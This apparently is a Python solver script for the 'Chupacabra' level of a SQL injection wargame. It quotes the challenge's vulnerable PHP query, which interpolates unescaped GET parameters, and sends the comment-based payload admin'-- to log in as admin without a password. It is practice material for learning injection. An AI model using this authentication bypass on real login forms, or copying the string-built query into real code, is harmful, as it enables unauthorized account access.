#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Chupacabra 37

    $db = sqlite_open("./db/chupacabra.db");
    $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlite_fetch_array(sqlite_query($db,$query));
    if($result['id'] == "admin") solve("chupacabra");
    """

    url = "https://los.rubiya.kr/chall/chupacabra_8568ab6205bea61d634a8cc67484a35c.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'id'

    payload = "admin'-- "
    p = los.SqlInjection(url, cook, method, inj_param, payload)

    response = p.my_request()
    if 'Clear!' in response:
        print('\nChupacabra Clear!')


if __name__ == '__main__':
    main()
